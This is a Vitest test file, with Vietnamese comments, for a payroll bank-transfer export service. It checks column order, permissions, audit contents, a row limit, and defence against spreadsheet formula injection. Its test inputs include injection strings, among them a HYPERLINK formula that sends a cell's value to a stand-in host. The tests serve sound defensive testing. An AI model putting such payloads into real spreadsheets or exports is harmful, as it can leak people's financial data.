import { UnprocessableEntityException } from "@nestjs/common";
import { sql } from "drizzle-orm";
import { describe, expect, it, vi } from "vitest";
import {
  PayrollPaymentExportService,
  UNC_COLUMNS,
  xlsxSafe,
} from "./payroll-payment-export.service";
import { PAYROLL_EXPORT_MAX_ROWS } from "./payroll-export.service";
import type { PayrollActor, PayrollRequestUser } from "./payroll.types";

/**
 * S15-PAYROLL-BE-4 — `PAYROLL-API-071` tệp UNC (plan §4.4 · §6.1.2). Bốn điều chỉ đo được ở tầng thuần:
 *  1. **BA cặp quyền, đúng THỨ TỰ** (`batchExport` · `periodExport` · `payslipList`) — thiếu cặp nào ⇒ 403 TRƯỚC khi
 *     chạm DB. Đo bằng nội dung lời gọi `resolveActor`, không bằng "có 403 hay không" (route đã 403 sẵn nếu thiếu cặp
 *     decorator — `deny-cases-vacuous-without-allow-case`).
 *  2. **7 cột đúng thứ tự** (D-6) — hợp đồng với cổng ngân hàng.
 *  3. **`xlsxSafe`** — chuỗi bắt đầu `= + - @` được tiền tố `'` (formula injection, QA-1).
 *  4. **Trần 10.000 dòng ⇒ 422 016** — stub repo trả đúng số biên; **tên tệp KHÔNG PII**; audit đúng MỘT hàng và
 *     KHÔNG chứa số TK/tiền.
 */

const USER: PayrollRequestUser = {
  id: "11111111-1111-4111-8111-111111111111",
  companyId: "22222222-2222-4222-8222-222222222222",
};
const BATCH_ID = "77777777-7777-4777-8777-777777777777";
const ACCOUNT_FULL = "0123456789";

const actorFor = (routeKey: PayrollActor["routeKey"]): PayrollActor => ({
  actorUserId: USER.id,
  companyId: USER.companyId,
  routeKey,
  routeScope: "Company",
  peopleVisibleCond: sql`true`,
  canSeeMoney: true,
});

const dbStub = { withTenant: (_c: string, fn: (tx: unknown) => unknown) => fn({}) };

const lineStub = (i: number, method: "bank" | "cash") => ({
  user_id: `user-${i}`,
  net: `${1000 + i}.00`,
  bank_account_snapshot: method === "bank" ? `${ACCOUNT_FULL}${i}` : null,
  bank_name_snapshot: method === "bank" ? "VCB" : null,
  account_holder_snapshot: method === "bank" ? `HOLDER ${i}` : null,
});

function build(rowCount: number, method: "bank" | "cash" = "bank") {
  const resolveActor = vi.fn(async (_u: PayrollRequestUser, key: PayrollActor["routeKey"]) =>
    actorFor(key),
  );
  const audit = { record: vi.fn(async (_tx: unknown, _entry: unknown) => undefined) };
  const batches = {
    findWithStatsTx: vi.fn(async () => ({
      id: BATCH_ID,
      code: "CT-202806-BANK-ABCD1234",
      method,
      status: "Ready",
      periodMonth: "2028-06",
    })),
    linesForExportTx: vi.fn(async () =>
      Array.from({ length: rowCount }, (_, i) => lineStub(i, method)),
    ),
  };
  const people = {
    namesByUserIdsTx: vi.fn(
      async (_tx: unknown, _a: PayrollActor, ids: readonly string[]) =>
        new Map(ids.map((id) => [id, { userId: id, displayName: `=NV ${id}`, employeeCode: id }])),
    ),
  };
  const svc = new PayrollPaymentExportService(
    dbStub as never,
    { resolveActor } as never,
    batches as never,
    people as never,
    audit as never,
  );
  return { svc, resolveActor, audit, batches };
}

async function readSheet(buffer: Buffer): Promise<string[][]> {
  const ExcelJS = await import("exceljs");
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(buffer as unknown as Parameters<typeof wb.xlsx.load>[0]);
  const sheet = wb.worksheets[0];
  const rows: string[][] = [];
  sheet.eachRow({ includeEmpty: false }, (row) => {
    const cells: string[] = [];
    row.eachCell({ includeEmpty: true }, (cell, col) => {
      cells[col - 1] = cell.value === null || cell.value === undefined ? "" : String(cell.value);
    });
    rows.push(Array.from(cells, (c) => c ?? ""));
  });
  return rows;
}

describe("S15-PAYROLL-BE-4 · xlsxSafe — chống formula injection", () => {
  it.each([
    ["=SUM(1)", "'=SUM(1)"],
    ["+1", "'+1"],
    ["-1", "'-1"],
    ["@cmd", "'@cmd"],
    ["Nguyễn Văn A", "Nguyễn Văn A"],
    ["", ""],
  ])("%j ⇒ %j", (input, expected) => {
    expect(xlsxSafe(input)).toBe(expected);
  });
});

describe("S15-PAYROLL-BE-4 · PayrollPaymentExportService (071)", () => {
  it("assert ĐỦ BA cặp theo thứ tự batchExport → periodExport → payslipList, TRƯỚC khi chạm DB", async () => {
    const { svc, resolveActor, batches } = build(3);
    await svc.export(USER, BATCH_ID);
    expect(resolveActor.mock.calls.map((c) => c[1])).toEqual([
      "batchExport",
      "periodExport",
      "payslipList",
    ]);
    expect(resolveActor.mock.invocationCallOrder[2]).toBeLessThan(
      batches.findWithStatsTx.mock.invocationCallOrder[0],
    );
  });

  it("7 cột ĐÚNG THỨ TỰ; số TK ĐẦY ĐỦ có trong tệp; Số tiền = net; Nội dung ASCII; tên NV được xlsxSafe", async () => {
    const { svc } = build(2);
    const { buffer, filename } = await svc.export(USER, BATCH_ID);
    expect(filename).toBe("unc-CT-202806-BANK-ABCD1234.xlsx");
    const rows = await readSheet(buffer);
    expect(rows[0]).toEqual([...UNC_COLUMNS.map((c) => c.header)]);
    expect(UNC_COLUMNS.map((c) => c.header)).toEqual([
      "STT",
      "Mã NV",
      "Họ tên",
      "Số tài khoản",
      "Ngân hàng",
      "Số tiền",
      "Nội dung",
    ]);
    expect(rows).toHaveLength(3);
    expect(rows[1][0]).toBe("1");
    expect(rows[1][1]).toBe("user-0");
    expect(rows[1][2]).toBe("'=NV user-0");
    expect(rows[1][3]).toBe(`${ACCOUNT_FULL}0`);
    expect(rows[1][4]).toBe("VCB");
    expect(rows[1][5]).toBe("1000");
    expect(rows[1][6]).toBe("Luong 2028-06 user-0");
    expect(rows[2][5]).toBe("1001");
  });

  it("đợt `cash` ⇒ hai cột tài khoản/ngân hàng RỖNG, vẫn xuất được", async () => {
    const { svc } = build(1, "cash");
    const { buffer } = await svc.export(USER, BATCH_ID);
    const rows = await readSheet(buffer);
    expect(rows[1][3]).toBe("");
    expect(rows[1][4]).toBe("");
    expect(rows[1][5]).toBe("1000");
  });

  // security-reviewer BE-4 M1: `bankAccountNumber` (039) là `z.string()` không giới hạn charset ⇒ snapshot có thể chở
  // công thức. Ô «Số tài khoản» PHẢI qua `xlsxSafe` như ba ô text còn lại; số TK hợp lệ (chữ số) giữ nguyên kể cả số 0 đầu.
  it("ô «Số tài khoản» qua xlsxSafe: snapshot bắt đầu `=` được tiền tố `'`; số TK chữ số (kể cả 0 đầu) giữ NGUYÊN", async () => {
    const { svc, batches } = build(2);
    batches.linesForExportTx.mockResolvedValueOnce([
      { ...lineStub(0, "bank"), bank_account_snapshot: '=HYPERLINK("http://x/?"&A2,"ok")' },
      { ...lineStub(1, "bank"), bank_account_snapshot: "0001234567" },
    ]);
    const { buffer } = await svc.export(USER, BATCH_ID);
    const rows = await readSheet(buffer);
    expect(rows[1][3]).toBe(`'=HYPERLINK("http://x/?"&A2,"ok")`);
    expect(rows[2][3]).toBe("0001234567");
  });

  it("audit ĐÚNG MỘT hàng `read` payroll_payment_batch {rowCount, format} — KHÔNG số TK, KHÔNG tiền", async () => {
    const { svc, audit } = build(2);
    await svc.export(USER, BATCH_ID);
    expect(audit.record).toHaveBeenCalledTimes(1);
    const entry = audit.record.mock.calls[0][1] as Record<string, unknown>;
    expect(entry["action"]).toBe("read");
    expect(entry["objectType"]).toBe("payroll_payment_batch");
    expect(entry["objectId"]).toBe(BATCH_ID);
    expect(entry["after"]).toEqual({ rowCount: 2, format: "xlsx" });
    const json = JSON.stringify(entry);
    expect(json).not.toContain(ACCOUNT_FULL);
    expect(json).not.toMatch(/net|amount|1000/);
  });

  it(`${PAYROLL_EXPORT_MAX_ROWS} dòng ⇒ 200; ${PAYROLL_EXPORT_MAX_ROWS + 1} ⇒ 422 PAYROLL-ERR-016 export-limit, 0 audit`, async () => {
    const ok = build(PAYROLL_EXPORT_MAX_ROWS);
    await expect(ok.svc.export(USER, BATCH_ID)).resolves.toBeTruthy();
    const over = build(PAYROLL_EXPORT_MAX_ROWS + 1);
    await expect(over.svc.export(USER, BATCH_ID)).rejects.toBeInstanceOf(
      UnprocessableEntityException,
    );
    try {
      await over.svc.export(USER, BATCH_ID);
    } catch (e) {
      const body = (e as UnprocessableEntityException).getResponse() as {
        code: string;
        details: Array<{ field: string; message: string }>;
      };
      expect(body.code).toBe("PAYROLL-ERR-016");
      expect(body.details.find((d) => d.field === "kind")?.message).toBe("export-limit");
    }
    expect(over.audit.record).not.toHaveBeenCalled();
  });
});
